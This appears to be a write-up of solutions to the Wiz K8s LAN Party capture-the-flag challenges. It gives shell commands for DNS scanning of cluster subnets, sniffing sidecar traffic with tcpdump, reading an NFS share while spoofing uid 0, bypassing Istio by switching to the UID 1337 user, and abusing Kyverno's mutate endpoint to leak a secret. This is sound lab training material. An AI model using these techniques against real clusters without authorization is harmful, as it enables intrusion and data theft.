# Wiz K8s LAN Party

https://k8slanparty.com/

## Challenge 1

```shell
# Reading throuhg https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html,
# let's first guess the IP range for the pods / services
cat /etc/resolv.conf
env
# Let's use the dns scanning tool baked in the pod
dnscan -subnet 10.100.0.0/16
# One domain stands out:
curl getflag-service.k8s-lan-party.svc.cluster.local.
```

## Challenge 2

```shell
# Reusing the previous challenge let us find another service
cat /etc/resolv.conf
env
dnscan -subnet 10.100.0.0/16
curl reporting-service.k8s-lan-party.svc.cluster.local
# Intercepting the pod's traffic allows us to read the side car container requests
tcpdump -v
```

## Challenge 3

```shell
# There's an EFS mounted on the pod with a `flag.txt` file in it.
# See https://docs.aws.amazon.com/eks/latest/userguide/efs-csi.html
df
# Directly reading from it does not work though.
cat /efs/flag.txt
# One can gather more information for this NFS with (like the version) with:
mountstats
# Then one DNS scan allows us to find the NFS IP.
# Note that we scan AWS private IPs and not the k8s 10.100.0.0/16 CIDR range, as this is a EFS (meaning AWS managed EFS).
dnscan -subnet 192.168.0.0/16
# Then we can use NFS CLIs to interact with it directly:
nfs-ls "nfs://192.168.124.98/?version=4&uid=0&gid=0"
nfs-cat "nfs://192.168.124.98//flag.txt?version=4&uid=0&gid=0"
```

## Challenge 4

```shell
# DNS recon gives us a new endpoint
dnscan -subnet 10.100.0.0/16
# It's protected by istio as its name indicates.
# There's one user named istio with UID 1337 that we can use to bypass the policy.
# See https://github.com/istio/istio/blob/0759c8572119b8c78eeed1e0bbd3c58efc748092/pilot/pkg/kube/inject/inject.go#L81C38-L81C42.
cat /etc/passwd | grep 1337
su istio
curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
```

## Challenge 5

```shell
# DNS recon gives us a few new endpoints
dnscan -subnet 10.100.0.0/16
# 10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
# 10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
# 10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
# 10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
# 10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
# 10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```

In another shell, use https://github.com/anderseknert/kube-review to craft [an admission request for a pod matching the policy](./pod.yaml):
```shell
go install github.com/anderseknert/kube-review@latest
kube-review create pod.yaml > pod.json
```

Let's copy the file to the pod and send it to kyverno:
```shell
curl -k -X POST -H "Content-Type: application/json" --data "@pod.json" https://kyverno-svc.kyverno.svc.cluster.local./mutate | jq -r -c '.response.patch' | base64 -d | jq -r -c '.[0].value[0].value'
```
